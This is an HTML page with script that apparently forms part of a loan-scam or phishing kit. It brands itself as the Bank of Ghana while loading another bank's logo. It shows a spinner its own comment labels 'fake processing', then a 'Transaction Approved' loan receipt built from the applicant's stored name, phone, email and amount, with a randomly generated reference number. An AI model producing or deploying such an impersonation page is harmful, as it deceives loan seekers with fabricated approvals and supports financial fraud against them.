<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<title>Application Successful</title>

<style>
  body {
    margin: 0;
    font-family: Arial, Helvetica, sans-serif;
    background: #f5f5f5;
    min-height: 100vh;
    display: flex;
    justify-content: center;
    align-items: center;
    padding: 16px;
  }

  /* LOADER */
  .loader-screen {
    position: fixed;
    inset: 0;
    background: #ffffff;
    display: flex;
    flex-direction: column;
    justify-content: center;
    align-items: center;
    z-index: 999;
  }

  .spinner {
    width: 50px;
    height: 50px;
    border: 5px solid #eee;
    border-top: 5px solid #0a8f55;
    border-radius: 50%;
    animation: spin 1s linear infinite;
    margin-bottom: 12px;
  }

  @keyframes spin {
    to { transform: rotate(360deg); }
  }

  .loader-text {
    font-size: 14px;
    color: #555;
  }

  /* CARD */
  .container {
    width: 100%;
    max-width: 460px;
    background: #ffffff;
    border-radius: 16px;
    padding: 0;
    box-shadow: 0 10px 25px rgba(0,0,0,0.12);
    overflow: hidden;
    display: none; /* hidden until loader finishes */
  }

  /* HEADER */
  .brand-bar {
    background: #0a8f55;
    color: #fff;
    text-align: center;
    padding: 18px;
  }

  .brand-bar img {
    height: 50px;
    margin-bottom: 6px;
  }

  .brand-text {
    font-size: 18px;
    font-weight: bold;
  }

  /* RECEIPT BODY */
  .receipt {
    padding: 20px;
    text-align: center;
  }

  .close-btn {
    position: absolute;
    top: 10px;
    right: 10px;
    width: 28px;
    height: 28px;
    background: #e11b22;
    color: #fff;
    border-radius: 50%;
    font-weight: bold;
    display: flex;
    align-items: center;
    justify-content: center;
    cursor: pointer;
  }

  .success-icon {
    font-size: 50px;
    color: #0a8f55;
    margin-bottom: 10px;
  }

  h1 {
    font-size: 20px;
    margin: 5px 0;
    color: #0a8f55;
  }

  .subtitle {
    font-size: 13px;
    color: #777;
    margin-bottom: 15px;
  }

  /* RECEIPT BOX */
  .receipt-box {
    border: 1px dashed #ccc;
    border-radius: 10px;
    padding: 15px;
    margin-top: 10px;
    text-align: left;
    background: #fafafa;
  }

  .row {
    display: flex;
    justify-content: space-between;
    margin-bottom: 10px;
    font-size: 13px;
  }

  .label {
    color: #666;
  }

  .value {
    font-weight: bold;
    text-align: right;
    max-width: 60%;
    word-break: break-word;
  }

  .reference {
    text-align: center;
    font-weight: bold;
    margin-bottom: 10px;
    color: #333;
  }

  .divider {
    border-top: 1px dashed #ccc;
    margin: 10px 0;
  }

  button.continue {
    margin-top: 16px;
    width: 100%;
    padding: 12px;
    font-size: 14px;
    background: #0a8f55;
    color: #fff;
    border: none;
    border-radius: 8px;
    cursor: pointer;
  }

  .footer-note {
    text-align: center;
    font-size: 12px;
    color: #777;
    margin-top: 10px;
  }

  @media (max-width: 480px) {
    .row {
      flex-direction: column;
      align-items: flex-start;
    }

    .value {
      text-align: left;
    }
  }
</style>
</head>

<body>

<!-- LOADER -->
<div class="loader-screen" id="loader">
  <div class="spinner"></div>
  <div class="loader-text">Processing your application...</div>
</div>

<!-- MAIN CONTENT -->
<div class="container" id="mainContent">

  <div class="brand-bar">
    <img src="GCB_logo.jpeg" alt="Bank Logo">
    <div class="brand-text">BANK OF GHANA</div>
  </div>

  <div class="receipt">
    <div class="close-btn" onclick="window.close()">✕</div>

    <div class="success-icon">✅</div>
    <h1>Transaction Approved</h1>
    <div class="subtitle">Loan application successfully verified</div>

    <div class="receipt-box">
      <div class="reference">
        Ref: <span id="reference">—</span>
      </div>

      <div class="divider"></div>

      <div class="row">
        <div class="label">Full Name</div>
        <div class="value" id="name">—</div>
      </div>
      <div class="row">
        <div class="label">Phone</div>
        <div class="value" id="phone">—</div>
      </div>
      <div class="row">
        <div class="label">Email</div>
        <div class="value" id="email">—</div>
      </div>
      <div class="row">
        <div class="label">Amount</div>
        <div class="value" id="amount">—</div>
      </div>

      <div class="divider"></div>

      <div class="row">
        <div class="label">Purpose</div>
        <div class="value" id="purpose">—</div>
      </div>
      <div class="row">
        <div class="label">Term</div>
        <div class="value" id="term">—</div>
      </div>
      <div class="row">
        <div class="label">Interest</div>
        <div class="value" id="interest">—</div>
      </div>
      <div class="row">
        <div class="label">Repayment</div>
        <div class="value" id="repayment">—</div>
      </div>
    </div>

    <button class="continue" onclick="window.location.href='index.html'">
      Done
    </button>

    <div class="footer-note">
      Please keep this receipt for your records.
    </div>
  </div>
</div>

<script>
  /* LOADER CONTROL */
  setTimeout(() => {
    document.getElementById('loader').style.display = 'none';
    document.getElementById('mainContent').style.display = 'block';
  }, 2000); // 2 seconds fake processing

  /* ORIGINAL SCRIPT (UNCHANGED) */
  const fullName = localStorage.getItem('fullName');
  const phone = localStorage.getItem('phone');
  const loanData = JSON.parse(localStorage.getItem('loanFormData') || '{}');

  if (!fullName || !phone) {
    alert('Session expired. Please start again.');
    window.location.href = 'index.html';
  }

  function generateReference() {
    const now = new Date();
    const date =
      now.getFullYear().toString() +
      String(now.getMonth() + 1).padStart(2,'0') +
      String(now.getDate()).padStart(2,'0');
    const rand = Math.floor(1000 + Math.random()*9000);
    return `BOG-${date}-${rand}`;
  }

  let reference = localStorage.getItem('loanReference');
  if (!reference) {
    reference = generateReference();
    localStorage.setItem('loanReference', reference);
  }

  document.getElementById('reference').textContent = reference;
  document.getElementById('name').textContent = fullName;
  document.getElementById('phone').textContent = phone;
  document.getElementById('email').textContent = loanData.email || '—';
  document.getElementById('amount').textContent = loanData.loanAmount
    ? `GHS ${Number(loanData.loanAmount).toLocaleString()}` : '—';

  document.getElementById('purpose').textContent = loanData.loanPurpose || '—';
  document.getElementById('term').textContent = loanData.loanTerm || '—';
  document.getElementById('interest').textContent = loanData.interestRate ? loanData.interestRate+'%' : '—';

  if (loanData.loanTerm && loanData.loanTerm.match(/\d+/)) {
    const days = parseInt(loanData.loanTerm.match(/\d+/)[0],10);
    const repayDate = new Date();
    repayDate.setDate(repayDate.getDate() + days);
    document.getElementById('repayment').textContent = repayDate.toLocaleDateString();
  } else {
    document.getElementById('repayment').textContent = '—';
  }
</script>

</body>
</html>
